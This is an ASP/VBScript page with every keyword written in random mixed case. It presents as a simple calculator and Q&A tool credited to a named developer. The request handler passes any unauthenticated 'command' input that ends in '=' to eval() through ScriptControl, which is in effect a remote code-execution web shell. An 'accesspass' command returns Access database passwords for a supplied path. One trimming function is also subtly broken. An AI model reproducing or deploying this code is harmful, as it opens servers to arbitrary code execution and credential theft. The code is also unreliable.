<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-01-20
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<!--#iNClUDe fILe="config.asp"-->
<%
cLAsS dLLcOMmANd
pRIvATe fRMnAMe
pRIvATe sUB cLAsS_iNItIAlIZe()
eND sUB
pRIvATe sUB cLAsS_tERmINaTE()
eND sUB
pUBlIC pROpERtY lET sETfRMnAMe(sTR)
fRMnAMe = sTR
eND pROpERtY
pUBlIC pROpERtY gET gETfRMnAMe()
gETfRMnAMe = fRMnAMe
eND pROpERtY
fUNcTIoN hANdACtIOn(bYVaL a)
dIM b, c
a = pHPtRIm(a)
c = a
iF iNStR(c, " ") > 0 tHEn
b = mID(c, 1, iNStR(c, " ") - 1)
c = mID(c, iNStR(c, " ") + 1)
eND iF
iF b = "ask" tHEn
hANdACtIOn = aSK(c)
eLSeIF iNStR("|access|accesspass|", "|" & lCAsE(b) & "|") > 0 tHEn
dIM d: sET d = nEW cLSaCCeSSpASs
dIM e
hANdACtIOn = hANdLEpATh(c) & " 密码为" & vBCrLF & d.iNNeR_gETaCCeSSpWD(hANdLEpATh(c), e, tRUe)
eLSeIF rIGhT(c, 1) = "=" tHEn
c = mID(a, 1, lEN(a) - 1)
hANdACtIOn = a & "" & gETvBScRIpT("function Run(a):Run=eval(a):end function ", c)
eLSeIF a = "test" tHEn
hANdACtIOn = a & "=" & gETvBScRIpT("function Run(a):Run=eval(a):end function ", "1+2")
eLSe
hANdACtIOn = aSK(a)
eND iF
cALl cREaTEfILe("1.txt", hANdACtIOn)
eND fUNcTIoN
fUNcTIoN aSK(a)
aSK = ""
iF iNStR("|35915100|", "|" & a & "|") > 0 tHEn
aSK = "35915100 仿站与ASP程序维护群"
eLSeIF iNStR("|313801120|qq313801120|", "|" & a & "|") > 0 tHEn
aSK = "313801120为作者QQ号" & vBCrLF & "多年WEB开发程序员。"
eLSeIF iNStR("|小云|小孙|孙晓云|", "|" & a & "|") > 0 tHEn
aSK = "孙晓云是这款软件的开发人员，" & vBCrLF & "可联系QQ313801120。11111"
eND iF
eND fUNcTIoN
fUNcTIoN eERr(a, b)
rESpONsE.wRItE ("<font color=red>" & a & "</font>：" & b)
eND fUNcTIoN
fUNcTIoN rW(a)
rESpONsE.wRItE a
eND fUNcTIoN
fUNcTIoN pHPtRIm(a)
pHPtRIm = tRImVBcRLf(a)
eND fUNcTIoN
fUNcTIoN eCHo(a, b)
cALl eCHoPRoMPt(a, b)
eND fUNcTIoN
fUNcTIoN tRImVBcRLf(a)
tRImVBcRLf = rTRiMVbCRlF(lTRiMVbCRlF(a))
eND fUNcTIoN
fUNcTIoN eCHoPRoMPt(a, b)
rESpONsE.wRItE "<font color=Green>" & a & "</font>：" & b & "<br>"
eND fUNcTIoN
fUNcTIoN rTRiMVbCRlF(a)
dIM b, c
b = lEN(a)
c = tRUe
wHIlE c aND b >= 2
iF mID(a, b, 1) = " " & mID(a, b, 1) = vBTaB tHEn
b = b - 1
eLSeIF mID(a, b - 1, 2) = vBCrLF tHEn
b = b - 2
eLSe
c = fALsE
eND iF
wENd
rTRiMVbCRlF = rTRiM(lEFt(a, b))
eND fUNcTIoN
fUNcTIoN lTRiMVbCRlF(a)
dIM b, c
b = 1
c = tRUe
wHIlE c
iF mID(a, b, 1) = " " oR mID(a, b, 1) = vBTaB tHEn
b = b + 1
eLSeIF mID(a, b, 2) = vBCrLF tHEn
b = b + 2
eLSe
c = fALsE
eND iF
wENd
lTRiMVbCRlF = rIGhT(a, lEN(a) - b + 1)
eND fUNcTIoN
fUNcTIoN gETvBScRIpT(bYVaL a, bYVaL b)
dIM c
sET c = cREaTEoBJeCT("ScriptControl")
c.lANgUAgE = "VBScript"
c.aDDcODe a
c.aDDcODe "Function mytest(): mytest = ""【vb内容】"":End Function"
gETvBScRIpT = c.rUN("Run", b)
eND fUNcTIoN
eND cLAsS
dIM dDLcD : sET dDLcD = nEW dLLcOMmANd	
sELeCT cASe rEQuESt("act")
cASe "handle" : cALl dDLcD.rW(dDLcD.hANdACtIOn(rEQuESt("command")))
cASe eLSe:dEFaULt()
eND sELeCT
sUB dEFaULt()
%>
<form id="form1" name="form1" method="post" action="?act=handle">
发送内容
<input name="command" type="text" id="command" value="3+3*5=" />
<input type="submit" name="button" id="button" value="提交" />
</form>
<form id="form2" name="form1" method="post" action="?act=handle">
发送内容
<input name="command" type="text" id="command" value="ask 35915100" />
<input type="submit" name="button" id="button" value="提交" />
</form>
<%eND sUB%>
